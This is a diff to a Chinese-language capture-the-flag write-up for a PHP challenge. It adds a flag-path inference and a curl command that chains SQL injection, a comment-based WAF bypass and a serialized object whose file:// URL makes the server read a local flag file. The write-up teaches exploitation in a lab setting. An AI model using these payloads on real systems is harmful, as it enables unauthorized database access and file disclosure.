@@ -123,6 +123,8 @@ SELECT * FROM users WHERE no = $no
 
 `UserInfo::get($url)` 使用 `curl_exec()`，**未限制协议**。注册时 `isValidBlog()` 限制只能 `http(s)://`，但通过 SQL 注入构造的 data 不经此验证，可直接 `file://` 读本地文件。
 
+**flag 路径推断：** PHP 报错泄露了 web 根路径 `/var/www/html/view.php`，故根目录为 `/var/www/html/`。结合 CTF 惯例（flag 常用文件名 `flag.php` / `flag` / `flag.txt`），拼出 `file:///var/www/html/flag.php` 直接命中。
+
 ### WAF 绕过
 
 `union` + `select` 连在一起被过滤，用注释分隔即可绕过：
@@ -201,9 +203,12 @@ O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file://
 
 ### Step 3：注入并获取 Flag
 
+```bash
+payload='O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
+curl -s -G --data-urlencode "no=-1 union/**/select 1,2,3,'${payload}'" "http://xxx/view.php"
 ```
-view.php?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
-```
+
+> **注意**：不能直接用双引号 `"` 包整个 URL，因为序列化字符串内部的 `"` 会与 Shell 双引号冲突，导致 URL 被截断。用 `--data-urlencode` 让 curl 自动编码即可。
 
 查看页面源码，`<iframe>` 中嵌入了 flag 文件的 base64 编码：
 
